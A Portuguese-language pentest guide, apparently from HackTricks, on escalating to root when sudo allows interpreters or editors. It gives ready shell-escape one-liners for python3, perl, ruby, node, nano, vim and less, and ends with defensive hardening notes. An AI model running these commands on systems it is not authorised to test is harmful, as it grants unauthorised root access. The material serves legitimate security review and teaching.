# Abuso de comandos do Sudo

{{#include ../../banners/hacktricks-training.md}}

## Interpretadores permitidos pelo Sudo

Se `sudo -l` permitir que um usuário execute um interpretador como root, trate isso como execução direta de código. Os interpretadores são projetados para executar código arbitrário, portanto, uma regra que permita `python3`, `perl`, `ruby`, `lua`, `node` ou binários semelhantes geralmente equivale à execução de comandos como root, a menos que os argumentos sejam rigorosamente restritos e validados.

Fluxo comum de revisão:
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
Outros exemplos de interpretadores:
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
O caminho exato importa. Se a regra do sudo permitir `/usr/bin/python3`, use esse caminho exato durante a validação:
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Editores permitidos pelo Sudo

Se `sudo -l` permitir que um usuário execute um editor interativo como root, trate isso como uma superfície de execução de comandos, não como uma permissão inofensiva para edição de arquivos. Editores frequentemente podem executar comandos shell, ler arquivos arbitrários, gravar arquivos arbitrários ou invocar helpers externos de dentro do editor.

Fluxo comum de revisão:
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Execução de comandos com Nano

Quando o `nano` é permitido por meio do sudo, a execução de comandos pode ser acessada pela interface do editor:
```text
Ctrl+R
Ctrl+X
```
Em seguida, forneça um comando como:
```bash
id
/bin/sh
```
Em alguns terminais, um shell interativo pode precisar que os fluxos padrão sejam redirecionados:
```bash
reset; /bin/sh 1>&0 2>&0
```
A sequência exata de teclas pode variar conforme a versão e as opções de compilação do nano, mas o problema de segurança é o mesmo: o editor está sendo executado como root e pode invocar comandos externos.

### Outros escapes comuns de editores

Editores no estilo Vim geralmente permitem a execução de comandos por meio de `:!`:
```text
:!/bin/sh
```
Paginadores como `less` também podem permitir a execução de shell:
```text
!/bin/sh
```
## Notas defensivas

- Evite conceder interpreters ou editores interativos por meio do sudo.
- Prefira wrappers fixos, pertencentes ao root, que executem uma única ação administrativa restrita.
- Se um interpreter for inevitável, restrinja o caminho exato do script e impeça argumentos controlados pelo usuário, imports graváveis, `PYTHONPATH` e a preservação insegura do ambiente.
- Se for necessária a edição de arquivos, restrinja o caminho exato do arquivo e considere usar `sudoedit` com versões corrigidas do sudo e tratamento rigoroso do ambiente.
- Analise `SETENV`, `env_keep`, diretórios de trabalho graváveis, caminhos de módulos/imports graváveis, `NOEXEC`, `use_pty` e logging, mas não os trate como um sandbox completo.
